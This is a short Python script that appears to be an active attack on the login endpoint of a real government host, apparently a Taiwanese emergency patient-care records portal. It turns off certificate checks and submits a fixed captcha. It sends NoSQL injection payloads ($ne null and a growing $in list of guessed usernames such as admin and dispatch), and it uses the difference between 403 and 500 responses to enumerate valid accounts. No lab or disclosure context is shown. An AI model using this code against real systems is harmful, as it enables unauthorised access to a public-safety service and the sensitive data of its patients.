import requests, json, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    r=s.post(BASE+"/login", json=body, timeout=10)
    return r.status_code

# 1. 确认总文档数: $ne:null
sc_ne = login({"username":{"$ne":None},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"})
print(f"$ne:null -> {sc_ne}  (403=多文档)")

# 2. 精确值匹配测试 (500=匹配到≤1, 403=匹配到>1)
# 用 $in 批量: 若候选列表里含2个真实用户名 -> 403
candidates=["admin","administrator","root","tpf","epcr","operator","user","test","operator1",
  "dispatch","rescue","ambulance","operator","admin1","user1","tpfadmin","epcradmin",
  "operator01","op","admin2","manager","supervisor","director","staff","account","sysadmin",
  "webadmin","itadmin","helpdesk","service","support","portal","account1","default","guest"]
# 分批 $in, 每批找哪个组合触发 403 (多文档)
print("\n=== $in 批量定位多文档组合 ===")
# 单值探测: 每个候选单独, 403=该值本身匹配>1(不可能), 500=匹配0或1
# 改为: 累积 $in, 当结果从500变403时, 说明加入了第2个真实用户名
acc=[]
for c in candidates:
    acc.append(c)
    body={"username":{"$in":acc},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    sc=login(body); time.sleep(0.05)
    if sc==403:
        print(f"  ** $in(含 {c}) -> 403! 真实用户名集合={acc}")
        break
else:
    print("  全候选 $in 未触发403 (用户名不在列表或集合<2)")
print("DONE")
